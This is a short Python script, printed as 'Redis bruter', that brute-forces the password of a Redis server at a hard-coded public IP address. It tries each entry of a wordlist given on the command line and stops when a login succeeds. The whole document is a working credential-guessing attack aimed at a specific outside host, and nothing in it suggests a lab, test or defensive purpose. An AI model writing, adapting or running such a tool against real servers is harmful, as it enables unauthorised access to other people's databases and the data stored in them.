import redis
import sys

words = open(sys.argv[1],"r")
def check(host,password):
    print(f"[*] Checking : {password.strip()} As a Redis Paswsord [*]")
    redis_db = redis.StrictRedis(host=host, port=6379, db=0, password=password)
    try :
        redis_db.info()
        print(f"[+] Valid Password Found : {password.strip()}[+]")
        exit()
    except Exception as e :
        if "WRONGPASS invalid username-password" in str(e):
            print("[-] invalid password [-]")
if __name__=="__main__":
    print("[*] Redis bruter [*]")
    count=0
    for word in words :
        print(f"Password Count : {count}")
        check("196.219.234.2",word.strip())
